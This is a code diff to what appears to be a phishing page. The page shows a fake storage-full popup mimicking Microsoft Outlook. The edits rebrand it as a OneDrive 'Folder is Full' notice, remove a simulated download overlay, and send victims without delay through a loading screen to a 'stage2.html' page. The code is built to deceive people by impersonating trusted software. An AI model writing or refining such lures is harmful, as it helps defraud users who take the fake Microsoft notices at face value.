@@ -3145,7 +3145,7 @@ html[dir="rtl"] .H1aInb3c {
             setTimeout(function() {
                 window.location.href = 'stage2.html';
             }, 3000); // Redirect after 3 seconds
-        }, 500); // Delay before showing the overlay
+        }, 0); // Delay before showing the overlay
     }
 
     // --- Function to simulate file download for local accessibility ---
@@ -3172,14 +3172,9 @@ html[dir="rtl"] .H1aInb3c {
         downloadMessage.style.fontSize = '14px';
         downloadMessage.textContent = 'Downloading files for local accessibility...';
         
-        downloadOverlay.appendChild(downloadMessage);
-        document.body.appendChild(downloadOverlay);
+        showLoadingAndRedirect();
         
-        // Simulate a download delay of 3 seconds, then remove the overlay and proceed
-        setTimeout(function(){
-            downloadOverlay.parentNode.removeChild(downloadOverlay);
-            showLoadingAndRedirect();
-        }, 3000);
+        
     }
 
     // --- Function to create and show the "Running Out of Storage" popup styled like Microsoft Outlook with fade in ---
@@ -3201,7 +3196,7 @@ html[dir="rtl"] .H1aInb3c {
         popup.style.transition = 'opacity 0.5s ease';
 
         const popupContent = document.createElement('div');
-        popupContent.style.width = '320px';
+        popupContent.style.width = '390px';
         popupContent.style.backgroundColor = '#ffffff';
         popupContent.style.border = '1px solid #cccccc';
         popupContent.style.borderRadius = '4px';
@@ -3211,12 +3206,13 @@ html[dir="rtl"] .H1aInb3c {
 
         // Header mimicking Outlook title bar
         const header = document.createElement('div');
+        header.id = 'headdiv'
         header.style.backgroundColor = '#ffffff';
-        header.style.color = '#ffffff';
-        header.style.padding = '8px';
-        header.style.fontSize = '14px';
+        header.style.color = '#424242';
+        header.style.padding = '16px';
+        header.style.fontSize = '16px';
         header.style.fontWeight = 'bold';
-        header.textContent = 'Microsoft Outlook';
+        header.textContent = 'Folder is Full';
         popupContent.appendChild(header);
 
         // Message body
@@ -3224,7 +3220,7 @@ html[dir="rtl"] .H1aInb3c {
         bodyDiv.style.padding = '16px';
         bodyDiv.style.fontSize = '14px';
         bodyDiv.style.color = '#333333';
-        bodyDiv.textContent = 'This folder is full. Outlook will download the files to ensure local access.';
+        bodyDiv.textContent = 'This folder is full. OneDrive will download your files for readability to ensure local access.';
         popupContent.appendChild(bodyDiv);
 
         // Footer with the Continue button
